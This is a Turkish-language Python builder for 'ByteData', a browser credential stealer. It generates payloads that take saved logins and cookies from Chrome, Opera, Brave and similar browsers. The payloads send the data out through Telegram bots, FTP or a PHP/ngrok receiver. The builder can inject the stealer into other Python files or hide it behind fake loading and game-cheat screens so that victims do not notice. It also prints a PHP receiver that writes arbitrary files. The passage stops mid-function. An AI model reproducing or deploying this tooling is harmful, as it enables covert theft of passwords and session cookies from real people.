import os,sys,time,platform,base64,json,urllib.request as req,random,threading,shutil
from data import interface
isim = os.getlogin()
konum = os.getcwd()
sistem = platform.system()
if sistem == "Windows" and int(platform.uname().release) < 10:
    print("\n\tRenk kodlarını desteklemeyen sistem kullanıyorsunuz . Renkler devre dışı bırakıldı !")
    kirmizi = yesil = sari = mavi = pembe = camgoz = normal = ""
else:
    kirmizi , yesil , sari , mavi , pembe , camgoz , normal = "\033[31m","\033[32m","\033[33m","\033[34m","\033[35m","\033[36m","\033[0m"
try:
    def temizle():
        if sistem == "Windows":os.system("cls")
        else:os.system("clear")

    def slogan(mesaj=""):
        print(f"""                  {mesaj}
        ▄▄▄▄·  ▄· ▄▌▄▄▄▄▄▄▄▄ .·▄▄▄▄   ▄▄▄· ▄▄▄▄▄ ▄▄▄· 
        ▐█ ▀█▪▐█▪██▌•██  ▀▄.▀·██▪ ██ ▐█ ▀█ •██  ▐█ ▀█ 
        ▐█▀▀█▄▐█▌▐█▪ ▐█.▪▐▀▀▪▄▐█· ▐█▌▄█▀▀█  ▐█.▪▄█▀▀█ 
        ██▄▪▐█ ▐█▀·. ▐█▌·▐█▄▄▌██. ██ ▐█ ▪▐▌ ▐█▌·▐█ ▪▐▌
        ·▀▀▀▀   ▀ •  ▀▀▀  ▀▀▀ ▀▀▀▀▀•  ▀  ▀  ▀▀▀  ▀  ▀ 
        """)
    def ts(mesaj=""):
        temizle()
        slogan(mesaj)
        
    def exit1(neden):
        print("\n\t"+neden+"\n")
        exit0()
        
    def exit0():sys.exit(input(f"\t{kirmizi}Çıkmak için {yesil}[Enter]{normal} "))
    def update():
        try:
            print("\tGüncelleme kontrol ediliyor !")
            from data import about
            update = requests.get("http://bytedata.tk/update",timeout=3).text
            update = json.loads(update)
            if update["version"] > about.bytedata_version:
                ts()
                input(f"\t{kirmizi}Yeni güncelleme mevcut !{normal}\n\n\tVersiyon : {update['version']}\n\tDeğişiklikler : {update['update_reason']}\n\n\thttps://github.com/raif-py/bytedata ")
        except Exception as hata:input("\n\tGüncellemeler kontrol edilirken hata ile karşılaşıldı :\n\t"+str(hata)+f"\n\n\t[{kirmizi}Devam Et{normal}]")
    def oneri():
        try:
            oneri = input(sari+"    Bu menüde ne görmek isterdiniz : "+normal)
            if oneri:
                requests.post("http://bytedata.tk/istek/index.php",data={"icerik":"----\n"+str(platform.uname())+"\n"+oneri+"\n----"})
                print(yesil+"\n    Önerileriniz bizim için çok önemli , Teşekkür ederiz .."+normal)
                time.sleep(2)
        except Exception as hata:ts();input(kirmizi+"\n\tÖneri yollanırken hata ile karşılaşıldı ! :"+normal+"\n\n\tHata:\n\t"+str(hata))      

    def raport(oneri):
        try:
            requests.post("http://bytedata.tk/istek/index.php",data={"icerik":"----RAPOR----\n"+str(platform.uname())+"\n"+oneri+"\n----"})
            #print(yesil+"\n    Önerileriniz bizim için çok önemli , Teşekkür ederiz .."+normal)
            #time.sleep(2)
        except:pass      
    tg_id,tg_token,ftp_host,ftp_pass,ftp_username,url="","","","","",""
    php_kodu = """
    <?php
    $dosya = $_POST["dosya"];
    $isim = $_POST["isim"];
    $icerik = $_POST['icerik'];
    if(!file_exists($isim)){
        mkdir($isim);
    }
    $fp = fopen($dosya,'a');
    fwrite($fp, $icerik);
    fclose($fp);?>
    """
    ################### BURAYA DEVAM ET #########################################################################################################################################################################

    seri = sys.argv
    if len(seri) > 1:
        if not seri[1] in "chrome chromium opera opera_gx brave yandex edge".split():
            sys.exit(f"Bilinmeyen komut : {seri[1]} \n\nVarsayılanlar : chrome chromium opera opera_gx brave yandex edge")

    ############33################################################################################################################################################################################################

    ts()

    try:import PyInstaller
    except:exit1("pyinstaller kütüphanesi yüklü değil ! : pip3 install pyinstaller")

    try:import requests
    except:exit1("requests kütüphanesi yüklü değil ! pip3 install requests")

    try:import tkinter;from tkinter import messagebox
    except:exit1("tkinter modülü yüklü değil ! : sudo apt install python3-tk | sudo pacman -S tk")

    try:import py_compile
    except:exit1("py_compile yüklü değil !")

    if sistem == "Windows":
        try:
            import win32crypt
        except:
            exit1(kirmizi+"win32crypt modülü yüklü değil !"+normal+"\n\tŞunları dene : pip install pywin32 & pip install win32crypt")
    elif sistem == "Linux":
        try:
            import Crypto
        except:
            print(kirmizi+"\tCrypto modülü yüklü değil !"+normal+" Lütfen Dene : \n")
            print("\tpip3 uninstall crypto\n\tpip3 install crypto\n\tpip3 uninstall pycryptodome\n\tpip3 install pycryptodome\n")
            print("\tDaha Detaylı Bilgi Için : https://github.com/dlitz/pycrypto/issues/156")
            exit0()
    else:
        print(kirmizi+"\tSistemin desktelenmiyor ! [Henüz]"+normal)
        raport("Otomatik Desteklenmeyen Sistem Mesajı !")
        exit0()

    update() # Başına "#" getirerek güncelleme kontrolünü kapatabilirsin

    while 1:
        ts()
        tip = input(f"""\t{yesil}[ {normal}1{yesil} ]{normal} Chrome
        {yesil}[ {normal}2{yesil} ]{normal} Chromium
        {yesil}[ {normal}3{yesil} ]{normal} Opera
        {yesil}[ {normal}4{yesil} ]{normal} BraveBrowser

        {kirmizi}[ {normal}A{kirmizi} ]{normal} Hepsi
        {sari}[ {normal}I{sari} ]{normal} Bilgi
        {kirmizi}[ {normal}X{kirmizi} ]{normal} Çıkış

        {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
        if tip == "x":exit0()
        elif tip == "i":
            ts()
            print(f"""
            {yesil}Tarayıcı seç{normal}'e ait bilgiler : 

            ByteData listenen tarayıcılardan "Login Data" & "Cookies"'leri aşırmaya yönelik pentests aracıdır
            İşlem bittiğinde .pyw , .pyc ve işletim sisteminizin çalıştırabileceği formatda bir çıktı verecektir
            Verilen çıktıyı çalıştıran kişinin bilgileri PHP , FTP veya Telegram Api'si ile size ulaştırılacaktır
            
            Eklenmesini istediğiniz tarayıcı var ise GITHUB'dan ulaşabilirsiniz .
            """)
            input("\n\t[Devam Et]")
        elif tip == "1":tip = "chrome";break
        elif tip == "2":tip = "chromium";break
        elif tip == "3":tip = "opera";break
        elif tip == "4":tip = "brave";break
        elif tip == "a":tip = "hepsi";break
        elif tip == base64.b64decode(b"ZGV2").decode():
            ts()
            print("\n\n")
            for i in b'\xff\xfeK\x00o\x00d\x00l\x00a\x00r\x001\x01 \x00i\x00n\x00c\x00e\x00l\x00e\x00y\x00e\x00r\x00e\x00k\x00 \x00b\x00u\x00r\x00a\x00y\x001\x01 \x00b\x00u\x00l\x00d\x00u\x00\x1f\x01u\x00n\x00 \x00i\x00\xe7\x00i\x00n\x00 \x00m\x00i\x00n\x00n\x00e\x00t\x00t\x00a\x00r\x001\x01m\x00 \x00.\x00 \x00P\x00H\x00P\x00 \x00k\x001\x01s\x00m\x001\x01n\x00d\x00a\x00 \x00y\x00a\x00r\x00d\x001\x01m\x00c\x001\x01 \x00a\x00r\x001\x01y\x00o\x00r\x00u\x00m\x00\n\x00P\x00H\x00P\x00 \x00b\x00i\x00l\x00g\x00i\x00m\x00 \x00y\x00e\x00t\x00e\x00r\x00l\x00i\x00 \x00o\x00l\x00m\x00a\x00d\x001\x01\x1f\x011\x01 \x00i\x00\xe7\x00i\x00n\x00 \x00P\x00H\x00P\x00 \x00s\x00e\x00r\x00v\x00e\x00r\x00 \x00i\x00l\x00e\x00 \x00\xe7\x00a\x00l\x001\x01_\x01a\x00n\x00 \x00k\x001\x01s\x00m\x00d\x00a\x00 \x00a\x00\xe7\x001\x01k\x00 \x00v\x00a\x00r\x00 \x00.\x00.\x00.\x00\n\x00B\x00u\x00 \x00a\x00\xe7\x001\x01k\x00 \x00y\x00\xfc\x00z\x00\xfc\x00n\x00d\x00e\x00n\x00 \x00b\x00i\x00l\x00g\x00i\x00s\x00a\x00y\x00a\x00r\x00a\x00 \x00S\x00H\x00E\x00L\x00L\x00 \x00a\x00t\x001\x01l\x001\x01p\x00 \x00d\x00o\x00s\x00y\x00a\x00l\x00a\x00r\x00a\x00 \x00t\x00a\x00m\x00 \x00k\x00o\x00n\x00t\x00r\x00o\x00l\x00 \x00s\x00a\x00\x1f\x01l\x00a\x00n\x00a\x00b\x00i\x00l\x00i\x00r\x00 \x00.\x00.\x00\n\x00B\x00y\x00t\x00e\x00D\x00a\x00t\x00a\x00 \x00p\x00r\x00o\x00j\x00e\x00s\x00i\x00n\x00e\x00 \x00k\x00a\x00t\x00k\x001\x01d\x00a\x00 \x00b\x00u\x00l\x00u\x00n\x00m\x00a\x00k\x00 \x00i\x00s\x00t\x00e\x00r\x00s\x00e\x00n\x00 \x00l\x00\xfc\x00t\x00f\x00e\x00n\x00 \x00u\x00l\x00a\x00_\x01 \x00.\x00.\x00.\x00\n\x00\n\x00T\x00e\x00_\x01e\x00k\x00k\x00\xfc\x00r\x00l\x00e\x00r\x00\n\x00\n\x00'.decode("utf16").splitlines():
                print(kirmizi+"\t"+i+normal);time.sleep(3)
            input("")

    while 1:
        ts()
        arayuz_sec = input(f"""\tArayuz seçin : [Önizlem yapılacaktır ]
        
        {yesil}[ {normal}1{yesil} ]{normal} Yükleme Ekranları
        {yesil}[ {normal}2{yesil} ]{normal} Oyun Ekranları
        {sari}[ {normal}3{sari} ]{normal} Enjekte et (.py)

        
        {mavi}[ {normal}A{mavi} ]{normal} Öneri'de bulun
        {sari}[ {normal}I{sari} ]{normal} Bilgi
        {kirmizi}[ {normal}X{kirmizi} ]{normal} Çıkış

        {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
        if arayuz_sec == "x":exit0()
        elif arayuz_sec == "i":
            ts()
            print(f"\n\t{yesil}Arayüz Seç{normal}'e ait bilgiler\n\n\tElbette canavarımızın bir arayüzü olmak zorunda\n\tArayüz ne kadar inandırıcı olursa hedefin olayı anlamama ihtimali de bir hayli yüksek olur\n\n\tArayüz önerisi için lütfen 'a'yı tuşla , bize birkaç fikir ver")
            input()
        elif arayuz_sec == "a":oneri()
        elif arayuz_sec == "1":
            while 1:
                ts()
                arayuz = input(f"""
        {yesil}[ {normal}1{yesil} ]{normal} Default Yükleniyor Ekranı | ÖnIzlem : {yesil}[ {normal}11{yesil} ]{normal}
        
        {mavi}[ {normal}A{mavi} ]{normal} Öneri'de bulun
        {sari}[ {normal}I{sari} ]{normal} Bilgi
        {kirmizi}[ {normal}X{kirmizi} ]{normal} Geri

        {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
                if arayuz == "x":break
                elif arayuz == "i":ts();input(f"""\t{yesil}Yükleme Ekranı{normal}'na ait bilgiler gösteriliyor :\n\n\tStandart "Loading Please Wait" ekranı\n\tLakin biz bunu biraz daha grafiksel hale getirdik\n\n\tÖn İzlemler için belirten rakamı yazmanız yeterli olur : 11""")
                elif arayuz == "a":oneri()
                elif arayuz == "1":arayuz = "default";break
                elif arayuz == "11":threading.Thread(target=interface.interface_yukleniyor.default).start()
            if arayuz != "x":break

        elif arayuz_sec == "2":
            while 1:
                ts()
                arayuz = input(f"""
            {yesil}[ {normal}1{yesil} ]{normal} CS GO Fake Hack | ÖnIzlem : {yesil}[ {normal}11{yesil} ]{normal}
            {yesil}[ {normal}2{yesil} ]{normal} Zula Fake Hack  | ÖnIzlem : {yesil}[ {normal}22{yesil} ]{normal}
            {yesil}[ {normal}3{yesil} ]{normal} LoL Fake Hack   | ÖnIzlem : {yesil}[ {normal}33{yesil} ]{normal}
            
            {mavi}[ {normal}A{mavi} ]{normal} Öneri'de bulun
            {sari}[ {normal}I{sari} ]{normal} Bilgi
            {kirmizi}[ {normal}X{kirmizi} ]{normal} Geri

            {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
                if arayuz == "x":break
                elif arayuz == "i":ts();input(f"""\t{yesil}Oyun Ekranı{normal}'na ait bilgiler gösteriliyor :\n\n\tOyunlarda Hile yapmak için yazılan uygulamaların taklit ekranı\n\tOyunlarda hile yaparak kimsenin oyununu bozmayın !\n\n\tÖn İzlemler için belirten rakamı yazmanız yeterli olur : 11""")
                elif arayuz == "a":oneri()
                elif arayuz == "1":arayuz = "csgo_hack";break
                elif arayuz == "2":arayuz = "zula_hack";break
                elif arayuz == "3":arayuz = "lol_hack";break
                elif arayuz == "11":threading.Thread(target=interface.interface_oyun.csgo_hack).start()
                elif arayuz == "22":threading.Thread(target=interface.interface_oyun.zula_hack).start()
                elif arayuz == "33":threading.Thread(target=interface.interface_oyun.lol_hack).start()
                elif arayuz == ":D":pass # Biliyorum :D
            if arayuz != "x":break

        elif arayuz_sec == "3":
            while 1:
                try:
                    ts()
                    print("\tPython dosyasına küçük dostumuzu enjekte edeceğiz ..")
                    py_yolu=input(camgoz+"\n\t.py tam yolu : "+normal)
                    if py_yolu:
                        if not py_yolu.endswith(".py") and not py_yolu.endswith(".pyw"):
                            input(kirmizi+"\tPrensib meselesi sadece .py dosyaları kabul ediyoruz ! "+normal)
                        else:
                            if not os.path.exists(py_yolu):
                                print(kirmizi+"\n\tGirdiğiniz konumda aranan dosya bulunamadı !"+normal)
                                if not "/" in py_yolu and not "\\" in py_yolu:
                                    print("\n\tEnjekte edilecek dosyayı ByteData klasörüne atmanızı önermiyoruz ! ")
                                    print(yesil+"\n\tKlasördeki dosyalar : "+normal)
                                    for i in [i for i in os.listdir(konum) if i.endswith(".py") or i.endswith(".pyw")]:
                                        if i == "panel.py":print("\t"+i+kirmizi+"         [ByteData Project]"+normal)
                                        elif i == "bytedata_beta.py":print("\t"+i+kirmizi+" [ByteData Project]"+normal)
                                        elif i == "bytedata.py":print("\t"+i+kirmizi+"      [ByteData Project]"+normal)
                                        else:print("\t"+i)
                                    input()
                                elif "/" in py_yolu:
                                    print(yesil+"\n\tKlasördeki dosyalar : "+normal)
                                    for i in [i for i in os.listdir(py_yolu.rstrip(py_yolu[py_yolu.rfind("/"):])) if i.endswith(".py" or i.endswith(".pyw"))]:
                                        print("\t"+i)
                                    input()

                                elif "\\" in py_yolu:
                                    print(yesil+"\n\tKlasördeki dosyalar : "+normal)
                                    for i in [i for i in os.listdir(py_yolu.rstrip(py_yolu[py_yolu.rfind("\\"):])) if i.endswith(".py" or i.endswith(".pyw"))]:
                                        print("\t"+i)
                                    input()
                            else:
                                with open(py_yolu,"rb") as injection1:injection1=injection1.read().decode()
                                arayuz = "injection"
                                kod = "exit"
                                break
                except FileNotFoundError:input(sari+"\n\tBöyle bir dosya yok !"+normal)
                except PermissionError:input(sari+"\n\tErişim izni reddedildi !"+normal)
                except Exception as hata:print("Bilinmeyen hata ! :\n\t"+hata);raport(hata);exit0()
            if kod == "exit":break
    while 1:
        ts()
        yol = input(f"""
        {yesil}[ {normal}1{yesil} ]{normal} Telegram Api   # Telegram Botuna mesaj ile
        {yesil}[ {normal}2{yesil} ]{normal} Sunucu Server  # Web adresine POST ile
        {yesil}[ {normal}3{yesil} ]{normal} FTP Server     # FTP adresine upload ile
        
        {sari}[ {normal}I{sari} ]{normal} Bilgi
        {kirmizi}[ {normal}X{kirmizi} ]{normal} Çıkış

        {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
        if yol == "x":exit0()
        elif yol == "1":yol = "telegram";break
        elif yol == "2":yol = "php";break
        elif yol == "3":yol = "ftp";break
        elif yol == "i":
            ts()
            print(f"""
            {yesil}Yol Seç{normal}'e ait bilgiler : 

            Hedeften verileri almamız gerekiyor . Bunun için 3 tane seçenek sunuyoruz :
            
            *php
            *ftp
            *TG Api

            {sari}PHP Kullanarak{normal} :

                *İç ve Dış ağlarda özel sunucu açarak (ngrok)
                verileri post yöntemi ile kendimize çekeceğiz
                İç ağ için localhost:80 |:4444

                *Var ise size vereceğimiz PHP kodu ile kendi sitenizden de
                rahatlıkla kullanabilirsiniz

                *NGROK ile açılan alan adları tek kullanımlıktır , oturum açılmaz
                ise 6 saat erişim izni verilir

            {kirmizi}FTP Kullanarak{normal} :

                *FTP sunucunuza dosyaları upload etmiş olursunuz 

                *Tavsiye edilmez ..

            {yesil}TG Api Kullanarak{normal} :

                *Telegram 'ın bize sunduğu botları kullanarak
                veriler geldiği anda , erişimi olan botdan mesaj
                olarak gelecek . Ayrıca ByteData Telegram Bot'u ile
                bu aracı cihaz gerekliliği olmadan telegram üzerinden
                kullanabilirsiniz *Sunucumuz açık olduğu sürece

                * Uygulamadan giden isteklere bakılarak Telegram Token'i
                ve Sohbet Id'si ele geçirebilir.
                Token , sahibi tarafından değiştirilebilir lakin sohbet id'si 
                hedef tarafında bulunursa gizliliğinizi kaybedebilirsiniz
                ByteData Telegram Botunu kullanırsanız bu problem olmayacaktır

                *Tavsiye edilen yöntemdir


            {camgoz}* Bunların Hiç Biri Bende Yok . Ne Yapmam Gerekiyor ? {normal}

                1'i seçerek Telegram'ı seçin , size vereceğimiz talimatları kullanın

            Eklenmesini istediğiniz yol var ise GITHUB'dan ulaşabilirsiniz .
            """)
            input("\n\t[Devam Et]")
        elif yol == base64.b64decode(b"ZGV2").decode():pass

    if yol == "telegram":
        from data.telegram import tg_id,tg_token
        if not tg_id or not tg_token:
            while 1:
                ts()
                print("\n\tBotFather'a /newbot yazarak botunuzu oluşturun\n\tOluşturduğunuz bota /start vererek etkileşime geçin\n\tRose botuna /id yazarak kendi id'nizi öğrenin\n\tDeğerleri aşağıya girin , sizin için test edeceğiz ...\n\n\tÖrnek : \n\tToken = 867533205:AAEtuGY6fn4EFG4j4hCDsnShbu-218WnQWE\n\tId = 821818427\n")
                tg_token = input("\tTelegram Bot Tokeninizi Girin : ")
                tg_id = input("\tTelegram Id'nizi Girin : ")
                

                if not tg_token or not tg_id:print(kirmizi+"\n\tTG ID veya TG TOKEN Boş !"+normal);time.sleep(3)
                else:
                    try:
                        tg_test = requests.post("https://api.telegram.org/bot"+tg_token+"/sendMessage",data={"chat_id":tg_id,"text":"ByteData Telegram Message Test"})
                        tg_test = json.loads(tg_test.text)
                        if tg_test["ok"] == False:
                            print(kirmizi+"\n\tYapılandırma doğru değil !\n"+normal)
                            print("\n",tg_test,"\n")
                            input("\t[Tekrar Dene]")
                        else:
                            onay = input(f"\n\t{yesil}Bağlantı başarılı{normal} Bilgileri kaydetmemi istermisin ? E/H ").strip().lower
                            if onay == "h":
                                print("\tKaydedilmeden geçiliyor !")
                            else:
                                print("\tKaydediliyor !")
                                with open("data/telegram.py","w") as dosya:
                                    dosya.write(f'''tg_token = "{tg_token}"\ntg_id = "{tg_id}"''')
                                
                            break
                    except Exception as hata:
                        print(kirmizi+"\tApi'ye bağlanırken hata ile karşılaşıldı !\n\n\tManuel bağlanmayı deneyin :"+normal+"\n\thttps://api.telegram.org/bot"+tg_token+"/sendMessage?chat_id="+tg_id+"&text=ByteData\n\n\t"+kirmizi+"Hata :"+normal+"\n\t"+str(hata))
                        input("\n\t[Tekrar Deneyin]")
        else:
            ts()
            onay = input(f"""
            Token  = {tg_token}
            Id     = {tg_id}

            Daha önceden kayıtlı bilgilerini kullanmak istermisin ? {yesil}E{normal} | {kirmizi}H{normal} """).strip().lower()
            if onay == "h":
                while 1:
                    ts()
                    print("\n\tBotFather'a /newbot yazarak botunuzu oluşturun\n\tOluşturduğunuz bota /start vererek etkileşime geçin\n\tRose botuna /id yazarak kendi id'nizi öğrenin\n\tDeğerleri aşağıya girin , sizin için test edeceğiz ...\n\n\tÖrnek : \n\tToken = 867533205:AAEtuGY6fn4EFG4j4hCDsnShbu-218WnQWE\n\tId = 821818427\n")
                    tg_token = input("\tTelegram Bot Tokeninizi Girin : ")
                    tg_id = input("\tTelegram Id'nizi Girin : ")
                    

                    if not tg_token or not tg_id:print(kirmizi+"\tTG ID veya TG TOKEN Boş !"+normal);time.sleep(3)
                    else:
                        try:
                            tg_test = requests.post("https://api.telegram.org/bot"+tg_token+"/sendMessage",data={"chat_id":tg_id,"text":"ByteData Telegram Message Test"})
                            tg_test = json.loads(tg_test.text)
                            if tg_test["ok"] == False:
                                print(kirmizi+"\n\tYapılandırma doğru değil !\n"+normal)
                                print("\n",tg_test,"\n")
                                input("\t[Tekrar Dene]")
                            else:
                                onay = input(f"\t{yesil}Bağlantı başarılı{normal} Bilgileri kaydetmemi istermisin ? E/H ").strip().lower()
                                if onay == "h":
                                    print("\tKaydedilmeden geçiliyor !")
                                else:
                                    print("\tKaydediliyor !")
                                    with open("data/telegram.py","w") as dosya:
                                        dosya.write(f'''tg_token = "{tg_token}"\ntg_id = "{tg_id}"''')
                                    
                                break
                        except Exception as hata:
                            print(kirmizi+"\tApi'ye bağlanırken hata ile karşılaşıldı !\n\n\tManuel bağlanmayı deneyin :"+normal+"\n\thttps://api.telegram.org/bot"+tg_token+"/sendMessage?chat_id="+tg_id+"&text=ByteData\n\n\t"+kirmizi+"Hata :"+normal+"\n\t"+str(hata))
                            input("\n\t[Tekrar Deneyin]")


    elif yol == "php":
        while 1:
            ts()
            ag = input(f"""
        {yesil}[ {normal}1{yesil} ]{normal} Sunucum yok , benim için ayarla
        {yesil}[ {normal}2{yesil} ]{normal} Sunucum var , kodları ver yeter
        
        {sari}[ {normal}I{sari} ]{normal} Bilgi
        {kirmizi}[ {normal}X{kirmizi} ]{normal} Çıkış

        {camgoz}[{isim}]{camgoz} : """).strip().lower();print(normal)
            if ag == "x":exit0()
            elif ag == "i":
                ts()
                print("\n\tPHP Sunucularını kullanarak verileri kendimize | sunucumuza iletmiş olacağız .\n\tPHP ile tanışmıyorsanız '1' işaretleyin\n\n")
                input("    [Devam Et]")
            elif ag == "1":
                ts()
                try:
                    import flask
                except:
                    input(kirmizi+"\tFlask kütüphanesini bulunamadı . \n\tYüklemeniz bekleniyor"+normal+f"\n\tYükledikten sonra [{yesil}ENTER{normal}]\n\n\tIpucu : pip3 install flask")
                    try:
                        import flask
                    except:
                        exit1("Flask kütüphanesi bulunamadı !")
                

                if sistem == "Windows":
                    if not os.path.exists("ngrok.exe"):
                        import zipfile
                        print(kirmizi+"\tNGROK Bulunamadı .. "+yesil+"Indiriliyor !"+normal)
                        # Devamı windows'dan gelecek
                        try:
                            req.urlretrieve("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip","ngrok.zip")
                            with zipfile.ZipFile("ngrok.zip") as zip_yaz:zip_yaz.extractall()
                        except Exception as hata:
                            exit1("Ngrok yüklenirken hata ile karşılaşıldı !\n"+hata)
                        if not os.path.exists("ngrok.exe"):
                            exit1(f"Ngrok bulunamadı . {os.getcwd()} konumuna zipden çıkmış şekilde kopyalayın !")




                elif sistem == "Linux":
                    if not os.path.exists("ngrok"):
                        import zipfile
                        print(kirmizi+"\tNGROK Bulunamadı .. "+yesil+"Indiriliyor !"+normal)
                        mimari = platform.machine()

                        ###########################
                        # Mimari ayrımı
                        ###########################

                        if mimari == "aarch64":
                            try:
                                req.urlretrieve("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip","ngrok.zip")
                                with zipfile.ZipFile("ngrok.zip") as zip_yaz:zip_yaz.extractall()
                            except Exception as hata:
                                #ts()
                                print("\n\tNgrok https://ngrok.com Adresinden çekilirken bir hata ile karşılaşıldı ! \n\tHata :")
                                exit1(str(hata))

                            if os.path.exists("ngrok"):
                                os.system("chmod +x ngrok") # çalıştırma izni vermemiz gerekiyor !
                            else:
                                exit1(kirmizi+"\tngrok bulunamadı !"+normal)
                        else:
                            if not mimari == "x86_64":print(f"{kirmizi}\n\t{mimari} sistem kullanıyorsunuz !{normal}\n\tAma x86_64 mimari için ngrok indiriyoruz !")
                            try:
                                req.urlretrieve("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip","ngrok.zip")
                                with zipfile.ZipFile("ngrok.zip") as zip_yaz:zip_yaz.extractall()
                            except Exception as hata:
                                print("\n\tHata ile karşılaşıldı !")
                                exit1(hata)
                            if os.path.exists("ngrok"):
                                os.system("chmod +x ngrok")
                        if not os.path.exists("ngrok"):
                            exit1(f"Ngrok bulunamadı . {os.getcwd()} konumuna zipden çıkmış şekilde kopyalayın !")
                    

                ts()
                print(yesil+"\tFlask Server başlatılıyor !\n"+normal)
                from data import flask_server
                arkaplan = threading.Thread(target=flask_server.flask_start,args=(os,flask,kirmizi,yesil,normal))
                arkaplan.daemon = True
                arkaplan.start()
                time.sleep(2)
                kontrol = requests.post("http://localhost:8082",data={"kontrol":""}).status_code
                if not kontrol == 200:
                    exit1(kirmizi+"Flask server doğru çalışmıyor !"+normal+f"\n\tDönen Status Kodu : {kontrol}\n\n\tYeniden Başlat !")
                else:
                    print(yesil+"\tFlask server düzgün çalışıyor !"+normal)
                time.sleep(3)
                ts()
                print(yesil+"\tNgrok Server başlatılıyor !\n"+normal)
                
                ################################################
                
                if sistem == "Windows":
                    os.system("start ngrok.exe http 8082")
                    try:
                        time.sleep(3)
                        url = req.urlopen("http://127.0.0.1:4040/api/tunnels").read().decode()
                        url = json.loads(url)
                        url = url["tunnels"][0]["public_url"]
                        print(sari+f"\n\tURL = {url}{normal}")
                    except Exception as hata:
                        print("\t"+str(hata))
                        exit1(kirmizi+"\n\tBaşarısız !"+normal+"\n\tGörev yöneticisinden ngrok'u durdurup tekrar deneyin !")
                        
                else:
                    os.popen("./ngrok http 8082 &")
                    try:
                        time.sleep(3)
                        url = req.urlopen("http://127.0.0.1:4040/api/tunnels").read().decode()
                        url = json.loads(url)
                        url = url["tunnels"][0]["public_url"]
                        print(sari+f"\n\tURL = {url}{normal}")
                    except Exception as hata:
                        print("\t"+str(hata))
                        exit1(kirmizi+"\n\tBaşarısız !"+normal+"\n\tGörev yöneticisinden ngrok'u durdurup tekrar deneyin !")
                        
                time.sleep(1)
                kod = "exit"
                break



            elif ag == "2":
                ts()
                from data import php
                url = php.url
                if not url:
                    with open("kod.php","w") as yaz:
                        yaz.write(php_kodu)
                    while 1:
                        ts()
                        print(f"""\tAşağıdaki {yesil}php kodunu{normal} web adresinde çalışır hale getir """)
                        print("\t",*php_kodu.splitlines(),sep="\n\t")
                        print("\n")
                        if sistem == "Windows":
                            print(f"\t{sari}{os.getcwd()}\\kod.php konumuna yazıldı !"+normal)
                        else:print(f"\t{sari}{os.getcwd()}/kod.php konumuna yazıldı !"+normal)
                        url=input(f"\n\tPhp kodunun çalıştığı tam adresi giriniz\n\t{sari}örn :{normal} http://bytedata.tk/verilerial.php\n\n\tURL : ")
                        if url == "q":exit0()
                        elif url and not url.endswith(".php") and not url.endswith(".php/"):
                            input(kirmizi+"\n\tURL'in sonu .php ile bitmek zorunda !"+normal)
                        elif url:
                            
                            if not url.startswith("http://") and not url.startswith("https://"):
                                print("burdayız : " + url)
                                url="http://"+url
                            if not url.endswith("/"):
                                url = url+"/"
                            ts()
                            print(f"\t{camgoz}{url} Kontrol ediliyor !{normal}")
                            time.sleep(2)
                            try:
                                requests.post(url,data={"isim":"bytedata","dosya":"bytedata/test.php","icerik":"OK"})
                                print(yesil+"\tPost isteği yollandı , test ediliyor"+normal)
                                time.sleep(2)
                                kontrol = url.split("/")
                                kontrol = kontrol[:len(kontrol)-2]
                                kontrol = "/".join(kontrol)
                                if not kontrol.endswith("/"):
                                    kontrol = kontrol+"/"
                                cikti=req.urlopen(kontrol+"bytedata/test.php").read().decode()
                                if cikti == "OK":
                                    print(yesil+"\tHerşey tamam :)"+normal)
                                    time.sleep(2)
                                    if input(f"\n\tURL'yi kaydetmek istermisin {yesil}E{normal} | {kirmizi}H{normal} ") == "h":
                                        pass
                                    else:
                                        with open("data/php.py","w") as yaz:yaz.write(f"url='{url}'")
                                    kod = "exit"
                                    break
                                else:
                                    print("URL : "+kontrol)
                                    print(sari+"\n\t404 dönmedi lakin aradığımız OK yazısına da erişemedik"+normal)
                                    print("\tSunucuna bir göz gezdir . bytedata/test.php adında bir dosya oluşmuş olmalı !")
                                    if input(f"""\n\t{kirmizi}URL onaylansın mı{normal} [E ile herşey yolundaymış ile devam edilecek !]\n\tE | {kirmizi}H{normal} : """).strip().lower() == "e":kod="exit";break
                                    else:pass    
                            except Exception as hata:
                                input(f"\t{kirmizi}Hata ile karşılaşıldı : {normal} \n\t{hata}")
                elif url:
                    onay=input(f"""\n\tURL = {url}\n\n\tDaha önceki bilgileri kullanmak istermisiniz {yesil}E{normal} | {kirmizi}H{normal} : """)
                    
                    if onay == "h":
                        with open("kod.php","w") as yaz:
                            yaz.write(php_kodu)
                        while 1:
                            ts()
                            print(f"""\tAşağıdaki {yesil}php kodunu{normal} web adresinde çalışır hale getir """)
                            print("\t",*php_kodu.splitlines(),sep="\n\t")
                            print("\n")
                            if sistem == "Windows":
                                print(f"\t{sari}{os.getcwd()}\\kod.php konumuna yazıldı !"+normal)
                            else:print(f"\t{sari}{os.getcwd()}/kod.php konumuna yazıldı !"+normal)
                            url=input(f"\n\tPhp kodunun çalıştığı tam adresi giriniz\n\t{sari}örn :{normal} http://bytedata.tk/verilerial.php\n\n\tURL : ")
                            if url and not url.endswith(".php") and not url.endswith(".php/"):
                                input(kirmizi+"\n\tURL'in sonu .php ile bitmek zorunda !"+normal)
                            elif url:
                                if url == "q":exit0()
                                if not url.startswith("http://") and not url.startswith("https://"):
                                    print("burdayız : " + url)
                                    url="http://"+url
                                if not url.endswith("/"):
                                    url = url+"/"
                                ts()
                                print(f"\t{camgoz}{url} Kontrol ediliyor !{normal}")
                                time.sleep(2)
                                try:
                                    requests.post(url,data={"dosya":"bytedata","isim":"bytedata/test.php","icerik":"OK"})
                                    print(yesil+"\tPost isteği yollandı , test ediliyor"+normal)
                                    time.sleep(2)
                                    kontrol = url.split("/")
                                    kontrol = kontrol[:len(kontrol)-2]
                                    kontrol = "/".join(kontrol)
                                    if not kontrol.endswith("/"):
                                        kontrol = kontrol+"/"
                                    cikti=req.urlopen(kontrol+"bytedata/test.php").read().decode()
                                    if cikti == "OK":
                                        print(yesil+"\tHerşey tamam :)"+normal)
                                        time.sleep(2)
